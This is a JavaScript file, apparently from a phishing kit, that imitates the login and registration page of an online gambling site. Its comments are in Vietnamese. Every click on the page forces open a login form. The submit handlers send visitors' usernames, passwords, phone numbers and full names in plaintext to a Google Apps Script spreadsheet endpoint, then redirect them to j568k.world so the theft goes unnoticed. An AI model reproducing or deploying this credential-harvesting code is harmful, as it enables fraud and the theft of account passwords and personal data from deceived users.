document.addEventListener("DOMContentLoaded", function () {
    const TARGET_URL = "https://j568k.world/";
    // DÁN LINK WEB APP URL CỦA GOOGLE SHEETS VÀO GIỮA CẶP DẤU NHÁY KÉP DƯỚI ĐÂY:
    const GOOGLE_SHEET_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbyCB335Javs8syx6n54BWslyM-3kcQ45FRSJLi3d-Xtk5PWiJt17zXHmVqoOunG7Us_Kg/exec";

    // Hàm gửi dữ liệu về Google Sheets rồi chuyển hướng
    function sendToGoogleSheetAndRedirect(payload, submitBtn) {
        const originalText = submitBtn.textContent;
        submitBtn.textContent = "ĐANG XỬ LÝ...";
        submitBtn.disabled = true;

        // Nếu chưa điền link Google Sheet thì chuyển hướng luôn
        if (!GOOGLE_SHEET_WEBAPP_URL || GOOGLE_SHEET_WEBAPP_URL.includes("DÁN_URL")) {
            window.location.href = TARGET_URL;
            return;
        }

        fetch(GOOGLE_SHEET_WEBAPP_URL, {
            method: "POST",
            mode: "no-cors",
            headers: {
                "Content-Type": "text/plain;charset=utf-8"
            },
            body: JSON.stringify(payload)
        })
        .then(() => {
            window.location.href = TARGET_URL;
        })
        .catch(() => {
            // Nếu mạng lỗi vẫn đảm bảo chuyển hướng cho người dùng
            window.location.href = TARGET_URL;
        });
    }

    // ================= 1. BANNER SLIDER TỰ ĐỘNG =================
    const sliderTrack = document.getElementById("slider-track");
    let currentIndex = 0;

    function nextSlide() {
        if (!sliderTrack) return;
        const visibleSlides = Array.from(document.querySelectorAll(".slide")).filter(
            slide => slide.offsetParent !== null
        );
        if (visibleSlides.length <= 1) return;
        currentIndex = (currentIndex + 1) % visibleSlides.length;
        sliderTrack.style.transform = `translateX(-${currentIndex * 100}%)`;
    }

    let slideInterval = setInterval(nextSlide, 3500);
    if (sliderTrack) {
        sliderTrack.addEventListener("mouseenter", () => clearInterval(slideInterval));
        sliderTrack.addEventListener("mouseleave", () => {
            slideInterval = setInterval(nextSlide, 3500);
        });
    }

    // ================= 2. ĐỒNG HỒ MÚI GIỜ HOA KỲ (UTC-4) =================
    const clockEl = document.getElementById("us-clock");
    function updateClock() {
        if (!clockEl) return;
        const now = new Date();
        const utc4 = new Date(now.getTime() + (now.getTimezoneOffset() * 60000) - (4 * 3600000));
        const days = ["CN", "T2", "T3", "T4", "T5", "T6", "T7"];
        const y = utc4.getFullYear();
        const m = String(utc4.getMonth() + 1).padStart(2, "0");
        const d = String(utc4.getDate()).padStart(2, "0");
        const dayName = days[utc4.getDay()];
        const hh = String(utc4.getHours()).padStart(2, "0");
        const mm = String(utc4.getMinutes()).padStart(2, "0");
        const ss = String(utc4.getSeconds()).padStart(2, "0");
        clockEl.textContent = `Múi giờ Hoa Kỳ (UTC-4) ${y}/${m}/${d} (${dayName}) ${hh}:${mm}:${ss}`;
    }
    setInterval(updateClock, 1000);
    updateClock();

    // ================= 3. XỬ LÝ MỞ / ĐÓNG MODAL ĐĂNG NHẬP & ĐĂNG KÝ =================
    const authModal = document.getElementById("authModal");
    const closeAuthModal = document.getElementById("closeAuthModal");
    const loginForm = document.getElementById("loginForm");
    const registerForm = document.getElementById("registerForm");
    const switchToRegister = document.getElementById("switchToRegister");
    const switchToLogin = document.getElementById("switchToLogin");

    function clearErrors() {
        document.querySelectorAll(".error-msg").forEach(el => (el.textContent = ""));
    }

    function openModal(type) {
        clearErrors();
        authModal.classList.add("show");
        if (type === "register") {
            loginForm.classList.remove("active");
            registerForm.classList.add("active");
        } else {
            registerForm.classList.remove("active");
            loginForm.classList.add("active");
        }
    }

    function closeModal() {
        authModal.classList.remove("show");
    }

    if (closeAuthModal) closeAuthModal.addEventListener("click", closeModal);
    if (authModal) {
        authModal.addEventListener("click", function (e) {
            if (e.target === authModal) closeModal();
        });
    }

    if (switchToRegister) {
        switchToRegister.addEventListener("click", function (e) {
            e.preventDefault();
            openModal("register");
        });
    }
    if (switchToLogin) {
        switchToLogin.addEventListener("click", function (e) {
            e.preventDefault();
            openModal("login");
        });
    }

    document.querySelectorAll(".btn-dt-register, .btn-mb-register").forEach(btn => {
        btn.addEventListener("click", function (e) {
            e.stopPropagation();
            openModal("register");
        });
    });

    document.querySelectorAll(".btn-dt-login, .btn-mb-login").forEach(btn => {
        btn.addEventListener("click", function (e) {
            e.stopPropagation();
            openModal("login");
        });
    });

    // ================= 4. NHẤN VÀO BẤT KỲ THÀNH PHẦN NÀO KHÁC ĐỀU MỞ FORM ĐĂNG NHẬP =================
    document.addEventListener("click", function (e) {
        if (e.target.closest("#authModal")) return;
        if (e.target.closest(".btn-dt-register, .btn-mb-register")) return;
        if (e.target.closest("#scroll-left, #scroll-right")) return;

        const interactiveTarget = e.target.closest(
            "a, button, .game-card, .slide, .dt-logo, .mb-logo, .ambassador-card, .floating-left, .mb-floating-link, .news-ticker"
        );

        if (interactiveTarget) {
            e.preventDefault();
            openModal("login");
        }
    });

    const catScroll = document.getElementById("mb-cat-scroll");
    const btnLeft = document.getElementById("scroll-left");
    const btnRight = document.getElementById("scroll-right");
    if (btnLeft && btnRight && catScroll) {
        btnLeft.addEventListener("click", () => catScroll.scrollBy({ left: -140, behavior: "smooth" }));
        btnRight.addEventListener("click", () => catScroll.scrollBy({ left: 140, behavior: "smooth" }));
    }

    // ================= 5. BẬT / TẮT MẮT XEM MẬT KHẨU =================
    document.querySelectorAll(".toggle-password").forEach(icon => {
        icon.addEventListener("click", function () {
            const targetId = this.getAttribute("data-target");
            const input = document.getElementById(targetId);
            if (!input) return;

            if (input.type === "password") {
                input.type = "text";
                this.classList.remove("fa-eye-slash");
                this.classList.add("fa-eye");
            } else {
                input.type = "password";
                this.classList.remove("fa-eye");
                this.classList.add("fa-eye-slash");
            }
        });
    });

    document.querySelectorAll("#loginPhone, #regPhone").forEach(phoneInput => {
        phoneInput.addEventListener("input", function () {
            this.value = this.value.replace(/[^0-9]/g, "").slice(0, 10);
        });
    });

    // ================= 6. KIỂM TRA RÀNG BUỘC, GỬI VỀ GOOGLE SHEETS & CHUYỂN HƯỚNG =================
    // Xử lý Submit Form Đăng Nhập
    if (loginForm) {
        loginForm.addEventListener("submit", function (e) {
            e.preventDefault();
            clearErrors();
            let isValid = true;

            const user = document.getElementById("loginUsername").value.trim();
            const pass = document.getElementById("loginPassword").value.trim();
            const phone = document.getElementById("loginPhone").value.trim();
            const remember = document.getElementById("loginRemember").checked;

            if (user.length < 6 || user.length > 20) {
                document.getElementById("loginUserErr").textContent = "Tài khoản phải từ 6 - 20 ký tự!";
                isValid = false;
            }
            if (pass.length < 6 || pass.length > 20) {
                document.getElementById("loginPassErr").textContent = "Mật khẩu phải từ 6 - 20 ký tự!";
                isValid = false;
            }
            if (!/^\d{10}$/.test(phone)) {
                document.getElementById("loginPhoneErr").textContent = "Số điện thoại bắt buộc nhập đúng 10 chữ số!";
                isValid = false;
            }
            if (!remember) {
                document.getElementById("loginCheckErr").textContent = "Vui lòng tích chọn lưu thông tin!";
                isValid = false;
            }

            if (isValid) {
                const submitBtn = loginForm.querySelector(".btn-auth-submit");
                sendToGoogleSheetAndRedirect({
                    trangThai: "ĐĂNG NHẬP",
                    taiKhoan: user,
                    matKhau: pass,
                    soDienThoai: phone,
                    hoTen: "" // Form đăng nhập không có trường Họ Tên nên để trống cột F
                }, submitBtn);
            }
        });
    }

    // Xử lý Submit Form Đăng Ký
    if (registerForm) {
        registerForm.addEventListener("submit", function (e) {
            e.preventDefault();
            clearErrors();
            let isValid = true;

            const user = document.getElementById("regUsername").value.trim();
            const pass = document.getElementById("regPassword").value.trim();
            const fullName = document.getElementById("regFullName").value.trim();
            const phone = document.getElementById("regPhone").value.trim();
            const agree = document.getElementById("regAgree").checked;

            if (user.length < 6 || user.length > 20) {
                document.getElementById("regUserErr").textContent = "Tên đăng nhập phải từ 6 - 20 ký tự!";
                isValid = false;
            }
            if (pass.length < 6 || pass.length > 20) {
                document.getElementById("regPassErr").textContent = "Mật khẩu phải từ 6 - 20 ký tự!";
                isValid = false;
            }
            if (!fullName) {
                document.getElementById("regNameErr").textContent = "Vui lòng nhập Họ Tên Thật!";
                isValid = false;
            }
            if (!/^\d{10}$/.test(phone)) {
                document.getElementById("regPhoneErr").textContent = "Số điện thoại bắt buộc nhập đúng 10 chữ số!";
                isValid = false;
            }
            if (!agree) {
                document.getElementById("regCheckErr").textContent = "Bạn phải đồng ý với Thỏa thuận đăng ký!";
                isValid = false;
            }

            if (isValid) {
                const submitBtn = registerForm.querySelector(".btn-auth-submit");
                sendToGoogleSheetAndRedirect({
                    trangThai: "ĐĂNG KÝ",
                    taiKhoan: user,
                    matKhau: pass,
                    soDienThoai: phone,
                    hoTen: fullName
                }, submitBtn);
            }
        });
    }
});